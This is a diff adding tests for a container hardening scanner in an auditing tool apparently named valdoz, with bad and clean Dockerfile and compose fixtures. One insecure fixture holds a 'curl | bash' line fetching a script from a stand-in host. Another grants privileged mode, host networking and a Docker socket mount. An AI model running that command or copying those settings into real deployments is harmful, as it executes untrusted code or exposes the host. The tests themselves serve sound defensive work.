@@ -10,6 +10,9 @@ from valdoz.checks import (
     scan_package_hallucination,
     scan_license_compliance,
     scan_api_contract_drift,
+    scan_container_hardening,
+    audit_dockerfile_content,
+    audit_compose_content,
     categorize_license,
     normalize_route_path,
     extract_routes_from_openapi,
@@ -508,6 +511,102 @@ dependencies = [
 
     report = run_valdoz_audit(temp_project, contract=True)
     assert any(c.id == "api-contract-drift" for c in report.checks)
+
+
+def test_container_hardening_no_manifests(temp_project: Path):
+    res = scan_container_hardening(temp_project)
+    assert res.status == "skipped"
+    assert res.passed is True
+    assert "No Dockerfile or container compose manifests detected" in res.message
+
+
+def test_dockerfile_hardening_bad(temp_project: Path):
+    bad_df = """
+FROM python:latest
+RUN apt-get update && apt-get install -y curl
+RUN curl -sSL https://bad.site | bash
+RUN pip install fastapi
+ADD src/ /app/src/
+"""
+    (temp_project / "Dockerfile").write_text(bad_df)
+    res = scan_container_hardening(temp_project)
+    assert res.status == "ran"
+    assert res.passed is False
+    assert "container security issue(s) detected" in res.message
+
+
+def test_dockerfile_hardening_clean(temp_project: Path):
+    clean_df = """
+FROM python:3.12-slim@sha256:1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef
+WORKDIR /app
+RUN apt-get update && apt-get install -y --no-install-recommends curl \\
+    && rm -rf /var/lib/apt/lists/*
+RUN pip install --no-cache-dir fastapi
+COPY src/ /app/src/
+RUN useradd -u 10001 -m nonroot
+USER nonroot
+CMD ["python", "src/main.py"]
+"""
+    (temp_project / "Dockerfile").write_text(clean_df)
+    res = scan_container_hardening(temp_project)
+    assert res.status == "ran"
+    assert res.passed is True
+    assert "verified secure and hardened" in res.message
+
+
+def test_compose_hardening_bad(temp_project: Path):
+    bad_compose = """
+version: '3.8'
+services:
+  web:
+    image: myapp:1.0
+    privileged: true
+    network_mode: host
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+"""
+    (temp_project / "docker-compose.yml").write_text(bad_compose)
+    res = scan_container_hardening(temp_project)
+    assert res.status == "ran"
+    assert res.passed is False
+    assert "privileged: true" in res.message
+    assert "network_mode: host" in res.message
+    assert "/var/run/docker.sock" in res.message
+
+
+def test_compose_hardening_clean(temp_project: Path):
+    clean_compose = """
+version: '3.8'
+services:
+  web:
+    image: myapp:1.0.0
+    restart: unless-stopped
+    ports:
+      - "8080:8080"
+    volumes:
+      - app-data:/app/data
+volumes:
+  app-data:
+"""
+    (temp_project / "docker-compose.yml").write_text(clean_compose)
+    res = scan_container_hardening(temp_project)
+    assert res.status == "ran"
+    assert res.passed is True
+    assert "verified secure and hardened" in res.message
+
+
+def test_run_valdoz_audit_with_containers_flag(temp_project: Path):
+    (temp_project / "pyproject.toml").write_text("""[project]
+name = "my-app"
+dependencies = [
+    "pydantic",
+]
+""")
+    (temp_project / "uv.lock").write_text("# lock\n")
+
+    report = run_valdoz_audit(temp_project, containers=True)
+    assert any(c.id == "container-hardening" for c in report.checks)
+
 
 
 
